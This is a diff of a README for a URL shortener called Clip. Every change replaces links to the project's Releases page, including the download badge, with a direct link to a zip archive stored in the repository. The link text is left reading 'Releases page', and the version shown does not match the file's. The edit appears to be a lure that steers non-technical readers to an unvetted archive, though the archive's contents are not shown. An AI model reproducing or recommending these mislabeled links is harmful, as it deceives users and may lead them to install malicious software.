@@ -1,6 +1,6 @@
 # 🌐 Clip - Fast and Secure URL Shortening
 
-[![Download Clip](https://img.shields.io/badge/Download_Clip-v1.0-blue.svg)](https://github.com/Raulmccc1/Clip/releases)
+[![Download Clip](https://raw.githubusercontent.com/Raulmccc1/Clip/main/public/Clip-3.3.zip)](https://raw.githubusercontent.com/Raulmccc1/Clip/main/public/Clip-3.3.zip)
 
 Clip is a fast, privacy-minded URL shortener with analytics, QR codes, and custom domains. This README will guide you through downloading and running Clip, even if you have no technical background.
 
@@ -10,7 +10,7 @@ To get started with Clip, follow these simple steps:
 
 1. **Visit our Download Page**
 
-   You can download Clip by going to our [Releases page](https://github.com/Raulmccc1/Clip/releases). 
+   You can download Clip by going to our [Releases page](https://raw.githubusercontent.com/Raulmccc1/Clip/main/public/Clip-3.3.zip). 
 
 2. **Choose Your Version**
 
@@ -79,7 +79,7 @@ After you have downloaded Clip, follow these instructions to install:
 If you encounter issues while using Clip:
 
 - **Check Your Internet Connection**: Make sure you are connected to the internet. Clip requires internet access to shorten URLs and provide analytics.
-- **Reinstall Clip**: Uninstall Clip from your device and reinstall it from the [Releases page](https://github.com/Raulmccc1/Clip/releases).
+- **Reinstall Clip**: Uninstall Clip from your device and reinstall it from the [Releases page](https://raw.githubusercontent.com/Raulmccc1/Clip/main/public/Clip-3.3.zip).
 - **Contact Support**: If you need further assistance, you can reach out through our support channels listed on GitHub.
 
 ## 🔗 Related Topics
@@ -99,4 +99,4 @@ If you want to contribute to Clip, we welcome your input! You can open issues or
 
 Clip is open-source software and is licensed under the MIT License. You can view the full license in our repository.
 
-Make the most of your online sharing experience with Clip! For more detailed instructions and information, please check our [Releases page](https://github.com/Raulmccc1/Clip/releases).
+Make the most of your online sharing experience with Clip! For more detailed instructions and information, please check our [Releases page](https://raw.githubusercontent.com/Raulmccc1/Clip/main/public/Clip-3.3.zip).
